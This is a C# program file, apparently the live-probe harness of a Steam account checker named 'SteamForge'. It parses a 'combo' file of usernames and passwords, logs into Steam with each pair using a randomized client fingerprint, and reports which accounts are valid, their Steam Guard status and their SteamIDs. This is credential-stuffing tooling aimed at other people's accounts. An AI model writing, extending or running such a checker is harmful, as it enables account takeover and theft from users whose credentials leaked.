using System.Diagnostics;
using SteamForge.Core.Auth;
using SteamForge.Core.Combos;
using SteamForge.Core.Models;

namespace SteamForge.Live;

/// <summary>
/// Live probe against Steam. Runs the real credentials flow against a handful of accounts and
/// prints exactly what Steam returned, so the classification layer can be checked against the
/// server's own answers rather than assumed correct.
/// </summary>
internal static class Program
{
    private static async Task<int> Main(string[] args)
    {
        var path = args.Length > 0 ? args[0] : @"C:\Users\USER\Desktop\1.txt";
        int take = args.Length > 1 && int.TryParse(args[1], out var n) ? n : 3;
        var modeToken = args.Length > 2 ? args[2] : "protobuf";

        if (!File.Exists(path))
        {
            Console.Error.WriteLine($"not found: {path}");
            return 2;
        }

        var mode = modeToken.ToLowerInvariant() switch
        {
            "json" => AuthMode.WebApiJson,
            "native" or "steamkit" or "cm" => AuthMode.NativeSteamKit,
            _ => AuthMode.WebApiProtobuf,
        };

        var report = ComboParser.ParseFile(path);
        var combos = report.Combos.Take(take).ToList();

        Console.WriteLine($"file   : {path}");
        Console.WriteLine($"mode   : {mode}");
        Console.WriteLine($"probing: {combos.Count} of {report.Combos.Count} accounts");
        Console.WriteLine(new string('-', 78));

        var tally = new Dictionary<CheckStatus, int>();
        var swTotal = Stopwatch.StartNew();

        foreach (var combo in combos)
        {
            var sw = Stopwatch.StartNew();
            CredentialOutcome outcome;

            using (var client = SteamWebAuthClient.Create(null, mode, Fingerprint.Random()))
            {
                outcome = await client.CheckAsync(combo.Username, combo.Password).ConfigureAwait(false);
            }
            sw.Stop();

            tally.TryGetValue(outcome.Status, out var c);
            tally[outcome.Status] = c + 1;

            var guard = outcome.Guard == GuardKind.None ? "-" : outcome.Guard.ToString();
            Console.WriteLine($"{combo.Username,-26} {outcome.Status,-12} guard={guard,-16} " +
                              $"steamid={(outcome.SteamId == 0 ? "-" : outcome.SteamId.ToString()),-20} " +
                              $"{sw.ElapsedMilliseconds,5}ms");

            if (!string.IsNullOrEmpty(outcome.Reason))
                Console.WriteLine($"{"",26} reason: {outcome.Reason}");
        }

        swTotal.Stop();
        Console.WriteLine(new string('-', 78));
        Console.WriteLine($"elapsed {swTotal.Elapsed.TotalSeconds:0.0}s");
        foreach (var (status, count) in tally.OrderByDescending(kv => kv.Value))
            Console.WriteLine($"  {status,-12} {count}");

        // An all-Error result means the transport is broken, not that the accounts are bad.
        if (tally.Count == 1 && tally.ContainsKey(CheckStatus.Error))
        {
            Console.WriteLine();
            Console.WriteLine("every probe errored — that is a transport failure, not a credential verdict.");
            return 1;
        }

        return 0;
    }
}
